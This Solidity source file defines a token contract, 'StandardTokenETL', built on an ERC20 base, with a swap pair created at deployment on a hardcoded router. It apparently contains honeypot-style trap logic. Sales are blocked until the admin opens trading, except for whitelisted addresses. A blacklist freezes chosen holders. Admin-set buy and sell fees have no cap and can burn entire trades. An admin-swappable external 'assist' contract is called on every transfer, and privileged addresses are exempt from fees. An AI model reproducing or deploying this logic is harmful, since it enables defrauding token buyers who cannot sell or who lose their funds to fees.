// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./common.sol";
import "./iuniswap.sol";

abstract contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name_, string memory symbol_, uint8 decimals_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: transfer amount exceeds allowance"
            );
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - amount);
            }
        }

        _transfer(sender, recipient, amount);

        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + addedValue
        );
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "!from");
        require(recipient != address(0), "!to");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(
            senderBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _destroy(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: destroy from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(
            accountBalance >= amount,
            "ERC20: destroy amount exceeds balance"
        );
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _balances[address(0)] += amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

interface ISupportAssist {
    function _getTransType(
        address from,
        address to,
        uint256 amount
    ) external returns (uint256);

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) external returns (uint256);

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 fromtype,
        uint256 amount,
        uint256 actual,
        uint256 fee
    ) external returns (uint256);
}

contract StandardTokenETL is ERC20, WhiteList {
    address public immutable uniswapV2Pair;
    IUniswapV2Router02 public immutable uniswapV2Router;

    bool bOpen = false;
    uint256 bRatio = 10;
    uint256 sRatio = 10;

    ISupportAssist public assist;

    mapping(address => bool) private _isUniswapV2Pair;
    mapping(address => bool) private _isSupers;

    constructor(
        address _owners,
        uint256 _amount,
        string memory _name,
        string memory _symbol
    ) ERC20(_name, _symbol, 18) {
        _mint(_owners, _amount * 10 ** decimals());

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            0x10ED43C718714eb63d5aA57B78B54704E256024E
        );
        address uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(
                address(this),
                address(0x967487daD4899Ccd5CF81108d41E83999bE1cC07)
            );
        uniswapV2Pair = uniswapPair;
        uniswapV2Router = _uniswapV2Router;

        setUniswapV2Pair(uniswapPair, true);
        setSupe(_owners, true);
    }

    receive() external payable {}

    function openTrade(bool op, uint256 br, uint256 sr) external onlyAdmin {
        bOpen = op;
        bRatio = br;
        sRatio = sr;
    }

    function setSupe(address account, bool _bS) public onlyAdmin {
        _isSupers[account] = _bS;
    }

    function isSupe(address account) public view returns (bool) {
        return _isSupers[account];
    }

    function setAssist(address _assist) external onlyAdmin {
        require(address(assist) != _assist, "Token: Repeat Set");
        assist = ISupportAssist(_assist);
        setSupe(_assist, true);
    }

    function setUniswapV2Pair(address account, bool pair) public onlyAdmin {
        _isUniswapV2Pair[account] = pair;
    }

    function isUniswapV2Pair(address account) public view returns (bool) {
        return _isUniswapV2Pair[account];
    }

    function getTransType(
        address from,
        address to,
        uint256 amount
    ) internal returns (uint256) {
        uint256 tType = 0;
        if (address(assist) != address(0)) {
            tType = assist._getTransType(from, to, amount);
        }

        if (tType == 0 && isUniswapV2Pair(from)) {
            return 1;
        } else if (tType == 0 && isUniswapV2Pair(to)) {
            return 2;
        }
        return tType;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(
            balanceOf(from) >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        require(
            !isBlackListed(from),
            "ERC20: transfer from the blacklist address"
        );

        uint256 _realAmount = amount;
        uint256 _fromtype = getTransType(from, to, amount);
        uint256 _fee = 0;

        if (address(assist) != address(0)) {
            assist._beforeTokenTransfer(from, to, amount);
        }

        if (isSupe(from) || isSupe(to)) {} else {
            if (_fromtype == 1) {
                //buy
                _fee = (_realAmount * bRatio) / 1000;
            } else if (_fromtype == 2) {
                //sell
                require(bOpen || isWhiteListed(from), "no trade");
                _fee = (_realAmount * sRatio) / 1000;
            }
        }

        if (_fee > 0) {
            super._burn(from, _fee);
            _realAmount = _realAmount - _fee;
        }

        if (_realAmount > 0) {
            super._transfer(from, to, _realAmount);
        }

        if (address(assist) != address(0)) {
            assist._afterTokenTransfer(
                from,
                to,
                _fromtype,
                amount,
                _realAmount,
                _fee
            );
        }
    }
}
